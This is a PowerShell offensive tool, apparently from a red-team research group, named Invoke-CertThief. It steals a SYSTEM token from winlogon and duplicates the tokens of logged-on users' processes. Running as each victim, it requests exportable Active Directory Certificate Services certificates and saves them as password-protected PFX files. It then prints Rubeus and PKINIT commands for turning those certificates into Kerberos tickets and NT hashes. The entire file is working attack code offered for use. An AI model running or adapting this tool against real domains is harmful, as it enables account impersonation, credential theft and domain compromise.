<#
.SYNOPSIS
    Invoke-CertThief is a tool that allows you to request other users certificates using SSPI

.DESCRIPTION
    The script uses Windows API functions to obtain a token for a specified user process, impersonates that user, and then request a certificate. 
    The script generates a random password for the certificate.

.PARAMETER Username
    The username of the target user in DOMAIN\User format. If not specified, the certificates of all users whose sessions are present on the computer are requested.

.PARAMETER CA
    The configuration string for the Certificate Authority (CA) including the CA server name and CA name in ADCS.Server\CA-Name format.

.PARAMETER Template
    The name of the certificate template to be used for the certificate request.

.PARAMETER Domain
    Domain in which to find adcs. It's useful to use if you don't specify -CA parameter

.PARAMETER OutputPath
    Path where to save the certificate

.EXAMPLE
    Import-Module .\Invoke-CertThief.ps1
    Invoke-CertThief -Username <DOMAIN>\<Username> -CA <ADCS Server>\<CA> -Template <Template>
    Invoke-CertThief -Username CICADA\DomainAdmin -CA CA.cicada8.local\CICADA-ADCS-CA -Template User

.LINK


.NOTES
    You can find more offensive tools here: https://github.com/CICADA8-Research/ 
#>

function Invoke-CertThief {

    param(
        [string]$Username,
        [string]$CA,
        [string]$Domain = $($env:USERDNSDOMAIN),
        [string]$Template = "User",
        [string]$OutputPath = "C:\Windows\Temp"
    )

    Write-Host "Invoke-CertThief by CICADA8 Research Team" 
    
    if ([string]::IsNullOrWhiteSpace($CA)) {
        Write-Host "[?] CA is empty. Trying to find..."
        $caobject = Select-CertificationAuthority $Domain

        if ($caobject) {
            $CA = ($caobject.DNSHostName) + "\" + $($caobject.Name)
        } 
        else {
            return
        }
    }

    if ($CA) {
        Write-Host "[+] You have selected: $($CA)"
        Write-Host "[+] Template: $($Template)"
    }

    Set-Privilege 'SeDebugPrivilege' 
    Set-Privilege 'SeImpersonatePrivilege' 

    try {
        $sysres = Invoke-AsSystem
        if ($sysres)
        {
            write-host "[+] System impersonation success"
        }
        else 
        {
            write-host "[-] System impersonation failed"
        }
        $tokens = Get-Tokens -Username $Username
        if ($tokens.Count -eq 0) {
            throw "Zero Tokens found"
        }

        foreach ($token in $tokens)
        {
           
            $Username = $token.username
            
            if ([string]::IsNullOrWhiteSpace($Username))
            {
                continue
            }

            try
            {
                Write-Host "[+] Pwning: $($username)"
            
                $userDN = Get-UserDN -username $Username.Split('\')[-1]
            } 
            catch {
                continue
            }
            if ($userDN -eq $null)
            {
                Write-Host "[-] Cant find UserDN. Skipping.."
                continue
            }

            Write-Host "[+] UserDN: $($userDN)"
            
            $upn = "$($Username.Split('\')[-1])@$domain"
            $certPassword = Generate-RandomPassword -length 16

            # request.inf content
            $requestInfContent = @"
[NewRequest]
Subject="$userDN"
Exportable=TRUE
KeySpec=1
KeyUsage=0xf0
[RequestAttributes]
CertificateTemplate=$template
[Extensions] 
2.5.29.17 = "{text}UPN=$upn"
"@

            $infFilePath = $OutputPath + '\request.inf'
            Remove-Item $infFilePath | Out-Null
            while (!$(Test-Path $infFilePath))
            {
                $requestInfContent | Out-File -FilePath $infFilePath -Encoding ASCII -Force
            }
            $certRequestPath = $OutputPath + "\request.req"
            $certResponsePath = $OutputPath + "\response.cer"
            $rspPath = $OutputPath + "\response.rsp"
            $pfxPath = $OutputPath + "\" + $Username.Split('\')[-1] + $domain +".pfx"
            #Write-Host "[+] Certificate Path: $pfxPath"

            $commands = @(
                "certreq -new `"$inffilePath`" `"$certRequestPath`";",
                "timeout 5;"
                "certreq -submit -config `"$CA`" `"$certRequestPath`" `"$certResponsePath`";",
                "timeout 5;",
                "certreq -accept `"$certResponsePath`";",
                "timeout 5;"
                '$thumbprint = (Get-ChildItem -Path Cert:\CurrentUser\My | Select-Object -First 1).Thumbprint',
                '$cert = Get-Item -LiteralPath "Cert:\CurrentUser\My\$thumbprint";',
                "Export-PfxCertificate -Cert `$cert` -Password (ConvertTo-SecureString -String `"$certPassword`" -AsPlainText -Force) -FilePath `"$pfxPath`" -Force;"
                "Get-ChildItem Cert:\CurrentUser\My\$thumbprint | Remove-item"
            )

            $si = New-Object Win32+STARTUPINFO
            $pi = New-Object Win32+PROCESS_INFORMATION

        
            $commandsString = $commands -join "; "

            if ([Win32]::CreateProcessWithTokenW($token.token, 0, "C:\Windows\System32\cmd.exe", "/c powershell `"$commandsString`"", 0, [IntPtr]::Zero, $OutputPath, [ref]$si, [ref]$pi)) {
                timeout 10
                Write-Host "[+] Successfully created process as user: $Username"
                Write-Host "[+] Successfully exported certificate in $pfxPath with password ""$certPassword"""
                Write-Host "[+] You can now run Rubeus with the following syntax:"
                Write-Host ""
                Write-Host "Rubeus.exe asktgt /getcredentials /user:user /certificate:`"$pfxPath`" /password:`"$certPassword`" /domain:`"$domain`" /dc:`"DC IP`" /show"
                Write-Host ""
                Write-Host "or dump PFX file on your linux machine"
                Write-Host ""
                Write-Host "gettgtpkinit.py `"$domain`"/`"$Username`" -cert-pfx `"$pfxPath`" -pfx-pass `"$certPassword`" `"$Username`".ccache"
                Write-Host "KRB5CCNAME=`"$($Username.Split('\')[-1])`".ccache  python3 getnthash.py `"$domain`"/`"$($Username.Split('\')[-1])`" -key `"key from previous step`""
                Write-Host ""
            } else {
                $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Host "[-] Error in CreateProcessWithTokenW $($errorCode)"
            }

            # Clean up handles
            [Win32]::CloseHandle($pi.hProcess) | Out-Null
            [Win32]::CloseHandle($pi.hThread) | Out-Null
            [Win32]::CloseHandle($token.token) | Out-Null

            # Cleaning
            #Remove-Item $infFilePath -ErrorAction SilentlyContinue
            #Remove-Item $rspPath -ErrorAction SilentlyContinue
            #Remove-Item $certRequestPath -ErrorAction SilentlyContinue
            #Remove-Item $certResponsePath -ErrorAction SilentlyContinue
        }
    } 
    catch {
        Write-Host "[-] An exception occured: $_"
    }
}

function Invoke-AsSystem {
    $winlogonPid = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id

    if (($processHandle = [Win32]::OpenProcess(
            0x1000,
            $true,
            [Int32]$winlogonPid)) -eq [IntPtr]::Zero)
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
        return $false
    }

    $tokenHandle = [IntPtr]::Zero
    if (-not [Win32]::OpenProcessToken(
            $processHandle,
            [Win32]::TOKEN_DUPLICATE,
            [ref]$tokenHandle))
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
        return $false
    }

    $dupTokenHandle = [IntPtr]::Zero
    if (-not [Win32]::DuplicateTokenEx(
            $tokenHandle,
            0x02000000,
            [IntPtr]::Zero,
            0x02,
            0x01,
            [ref]$dupTokenHandle))
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
        return $false
    }

    try {
        if (-not [Win32]::ImpersonateLoggedOnUser(
                $dupTokenHandle))
        {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
            retrun $false
        }

        return $true
    } catch {
        return $false
    }

    return $false
}

function Get-UserDN {
    param (
        [Parameter(Mandatory = $true)]
        [string]$username
    )

    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$username))"


    $searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null

    $result = $searcher.FindOne()
    
    if ($result -ne $null) {
        return $result.Properties["distinguishedname"][0]
    }
    else {
        return $null
    }
}

function Generate-RandomPassword {
    param (
        [int]$length = 12
    )

    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@%^*()_+-=>?"
    $password = -join ((0..($length - 1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $password
}

function Get-Tokens {
    param (
        [string]$Username = ""
    )
    $local_tokens = @()
    $impersonateAllUsers = [string]::IsNullOrEmpty($Username)

    if ($impersonateAllUsers) {
        Write-Host "[+] All Users will be impersonated"
    }
    else {
        Write-Host "[+] User $($Username) will be impersonated"
    }

    $allProcesses = Get-CimInstance Win32_Process

    $loggedUsers = @{}

    foreach ($process in $allProcesses) {
        $processOwner = Invoke-CimMethod -InputObject $process -MethodName GetOwner
        $completeUsername = "$($processOwner.Domain)\$($processOwner.User)"

        if ($completeUsername.Contains(("NT A")) -or $completeUsername.Contains("\DWM") -or $completeUsername.Contains(("\UMFD")))
        {
            continue
        }

        if ($impersonateAllUsers) {

            if (-not $loggedUsers.contains($completeUsername)) {
                Write-Host "[+] Process ID: $($process.ProcessId) , Owner: $($processOwner.Domain)\$($processOwner.User)"
                $retval = $(Get-Token -ProcId $process.ProcessId)
                if ($retval -ne 0) {
                    $token = [PSCustomObject]@{
                        token = $retval
                        username =  "$($processOwner.Domain)\$($processOwner.User)"
                    }

                    $local_tokens += $token
                }
                $loggedUsers[$completeUsername] = $true
            }
        }
        elseif ($completeUsername -eq $Username) {
            Write-Host "[+] Process ID: $($process.ProcessId) , Owner: $($processOwner.Domain)\$($processOwner.User)"
            $retval = $(Get-Token -ProcId $process.ProcessId)
            if ($retval -ne 0) {
                $token = [PSCustomObject]@{
                    token = $retval
                    username =  "$($processOwner.Domain)\$($processOwner.User)"
                }

                $local_tokens += $token
            }

            break
        }
    }

    return $local_tokens
}



function Get-Token {
    param(
        [Parameter(Mandatory = $true)]
        [int]$ProcId
    )
    
    $processHandle = [Win32]::OpenProcess([Win32]::PROCESS_QUERY_INFORMATION, $true, $ProcId)
    if ($processHandle -eq $null -or $processHandle -eq 0)
    {
        $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host " [-] Error in OpenProcess() $($errorCode)"
        return [IntPtr]::Zero
    }

    $tokenHandle = [IntPtr]::Zero
    $duplicatedTokenHandle = [IntPtr]::Zero
    $tokenAccess = [Win32]::TOKEN_DUPLICATE

    if ([Win32]::OpenProcessToken($processHandle, $tokenAccess, [ref]$tokenHandle)) {
        if ([Win32]::DuplicateTokenEx($tokenHandle, 0x000F01FF, [IntPtr]::Zero, [Win32+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [Win32+TOKEN_TYPE]::TokenPrimary, [ref]$duplicatedTokenHandle)) {
            Write-Host " [+] Successfully obtained token from process ID $($ProcId)"
        }
        else {
            $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Host " [-] Error in DuplicateTokenEx $($errorCode)"
            $duplicatedTokenHandle = [IntPtr]::Zero
        }
        [Win32]::CloseHandle($tokenHandle) | Out-Null
    }
    else {
        $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host " [-] Error in OpenProcessToken $($errorCode)"
    }

    [Win32]::CloseHandle($processHandle) | Out-Null
    return $duplicatedTokenHandle
}

function Select-CertificationAuthority($domain) {
    $caList = Get-CertificationAuthorities $domain
    Write-Host "[+] Available CAs in $($domain)"
    
    if (-not $caList) {
        Write-Host "[-] NO CAs in $domain."
        return
    }
    
    $index = 1
    foreach ($ca in $caList) {
        Write-Host "    $($index) : $($ca.DNSHostName)\$($ca.Name)"
        $index++
    }

    [int]$selectedNumber = Read-Host "[?] Enter number of CA to request cert"

    $selectedCA = $caList[$selectedNumber - 1]

    if ($selectedCA) {
        return $selectedCA
    }
    else {
        Write-Host "[-] Invalid number"
    }
}

function Get-CertificationAuthorities([string]$domain) {
    $domainPath = ($domain -split '\.').ForEach({ "DC=$_" }) -join ','
    $ldapPath = "LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$domainPath"
   
    $directorySearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ldapPath)
    $directorySearcher.Filter = "(&(objectClass=pKIEnrollmentService))"
    
    $directorySearcher.FindAll() | ForEach-Object {
        $properties = $_.Properties
        [PSCustomObject]@{
            Name              = $properties.name[0]
            DNSHostName       = $properties.dnshostname[0]
            DistinguishedName = $properties.distinguishedname[0]
        }
    }
}

function Set-Privilege {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(
            'SeAssignPrimaryTokenPrivilege',
            'SeAuditPrivilege',
            'SeBackupPrivilege',
            'SeChangeNotifyPrivilege',
            'SeCreateGlobalPrivilege',
            'SeCreatePagefilePrivilege',
            'SeCreatePermanentPrivilege',
            'SeCreateSymbolicLinkPrivilege',
            'SeCreateTokenPrivilege',
            'SeDebugPrivilege',
            'SeEnableDelegationPrivilege',
            'SeImpersonatePrivilege',
            'SeIncreaseBasePriorityPrivilege',
            'SeIncreaseQuotaPrivilege',
            'SeIncreaseWorkingSetPrivilege',
            'SeLoadDriverPrivilege',
            'SeLockMemoryPrivilege',
            'SeMachineAccountPrivilege',
            'SeManageVolumePrivilege',
            'SeProfileSingleProcessPrivilege',
            'SeRelabelPrivilege',
            'SeRemoteShutdownPrivilege',
            'SeRestorePrivilege',
            'SeSecurityPrivilege',
            'SeShutdownPrivilege',
            'SeSyncAgentPrivilege',
            'SeSystemEnvironmentPrivilege',
            'SeSystemProfilePrivilege',
            'SeSystemtimePrivilege',
            'SeTakeOwnershipPrivilege',
            'SeTcbPrivilege',
            'SeTimeZonePrivilege',
            'SeTrustedCredManAccessPrivilege',
            'SeUndockPrivilege',
            'SeUnsolicitedInputPrivilege'
        )]
        [string[]]
        $Privilege,

        [switch]
        $Disable
    )

    begin {
        $signature = '[DllImport("ntdll.dll", EntryPoint = "RtlAdjustPrivilege")]
        public static extern IntPtr SetPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 
        [DllImport("advapi32.dll")]
        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);'
        Add-Type -MemberDefinition $signature -Namespace AdjPriv -Name Privilege
    }

    process {
        foreach ($priv in $Privilege) {
            [long]$privId = $null
            $null = [AdjPriv.Privilege]::LookupPrivilegeValue($null, $priv, [ref]$privId)
            $null = [AdjPriv.Privilege]::SetPrivilege($privId, !$Disable, $false, [ref]$null)
        }
    }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
    public const uint TOKEN_ADJUST_SESSIONID = 0x0100;

    public enum SECURITY_IMPERSONATION_LEVEL {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    public enum TOKEN_TYPE {
        TokenPrimary = 1,
        TokenImpersonation
    }
}
"@